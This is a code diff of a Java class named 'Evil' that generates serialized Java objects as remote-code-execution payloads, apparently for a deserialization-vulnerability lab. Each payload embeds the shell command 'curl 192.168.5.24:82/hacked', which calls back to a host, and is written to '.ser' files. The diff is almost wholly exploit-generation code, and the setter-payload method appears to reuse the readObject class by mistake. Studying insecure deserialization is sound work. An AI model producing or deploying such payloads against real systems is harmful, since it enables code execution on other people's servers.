@@ -5,20 +5,35 @@ import java.util.Base64;
 
 public class Evil {
     public static void main(String[] args) {
-        BookRCE myBook = new BookRCE("someTitle", "blub", "curl 192.168.5.24:82/hacked");
-        String myBookSerialized = serializeBook(myBook);
-		
 		try {
-			FileWriter fileWriter = new FileWriter("naughty.ser");
-			PrintWriter printWriter = new PrintWriter(fileWriter);
-			printWriter.print(myBookSerialized);
-			printWriter.close();
+			createBookRceReadObjectPayload();
+			createBookRceSetterPayload();
 		} catch (Exception e) {
             System.out.println(e.toString());
         }
     }
 
-    public static String serializeBook(BookRCE myBook) {
+	public static void createBookRceReadObjectPayload() throws IOException {
+		BookRceReadObject myBook = new BookRceReadObject("someTitle", "blub", "curl 192.168.5.24:82/hacked");
+		String myBookSerialized = serializeBook(myBook);
+
+		FileWriter fileWriter = new FileWriter("naughty_BookRceReadObject.ser");
+		PrintWriter printWriter = new PrintWriter(fileWriter);
+		printWriter.print(myBookSerialized);
+		printWriter.close();
+	}
+
+	public static void createBookRceSetterPayload() throws IOException {
+		BookRceReadObject myBook = new BookRceReadObject("someTitle", "blub", "curl 192.168.5.24:82/hacked");
+		String myBookSerialized = serializeBook(myBook);
+
+		FileWriter fileWriter = new FileWriter("naughty_BookRceSetter.ser");
+		PrintWriter printWriter = new PrintWriter(fileWriter);
+		printWriter.print(myBookSerialized);
+		printWriter.close();
+	}
+
+    public static String serializeBook(BookRceReadObject myBook) {
 		ByteArrayOutputStream baos = null;
 
 		try {
